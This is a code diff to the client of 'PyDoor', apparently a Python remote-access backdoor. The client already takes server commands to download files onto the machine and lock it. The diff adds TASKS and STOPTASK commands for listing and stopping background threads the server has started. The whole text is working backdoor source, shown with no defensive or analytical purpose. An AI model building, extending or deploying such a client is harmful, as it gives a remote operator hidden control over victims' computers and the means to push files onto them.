@@ -1,6 +1,7 @@
 """ PyDoor Client """
 import json
 import logging
+import threading
 import subprocess
 from contextlib import redirect_stdout, suppress
 from io import StringIO
@@ -46,6 +47,10 @@ class Client(BaseClient):
                 self.download()
             case 'LOCK':
                 self.lock()
+            case 'TASKS':
+                self.tasks()
+            case 'STOPTASK':
+                self.stoptask()
             case _:
                 logging.debug('Received unrecognized command: %s', command)
 
@@ -178,7 +183,7 @@ class Client(BaseClient):
             logging.error("Error downloading file from the web: %s", str(error))
             self.write(str(error).encode())
         else:
-            logging.info("Saved downloaded file from '%s' as '%s'", url, filename)
+            logging.info("Downloading file from '%s' as '%s'", url, filename)
             self.write(b'Success')
 
     def lock(self) -> None:
@@ -196,6 +201,39 @@ class Client(BaseClient):
         else:
             logging.info("Locked machine")
             self.write(b'LOCKED')
+
+    def tasks(self) -> None:
+        """ Get current tasks (background threads) """
+        tasks = []
+        for task in threading.enumerate():
+            # Skip threads that aren't server initiated tasks
+            if not task.name.startswith('['):
+                continue
+
+            info = json.loads(task.name)
+            tasks.append(info)
+
+        self.write(json.dumps(tasks).encode())
+
+    def stoptask(self) -> None:
+        """ Stop a running task """
+        task_id = self.read().decode()
+        logging.debug("Attempting to stop task (%s)", task_id)
+
+        # If the task is running, set the stop event
+        for task in threading.enumerate():
+            # Skip threads that aren't server initiated tasks
+            if not task.name.startswith('['):
+                continue
+
+            if task_id == str(task.native_id):
+                task.stop_event.set()
+                self.write(b'STOPPED')
+                logging.debug("Stopped task id: %s (%s)", task_id, task.name)
+                return
+
+        logging.debug("Thread (%s) could not be found.", task_id)
+        self.write(b"Thread does not exist.")
 
 
 if __name__ == '__main__':
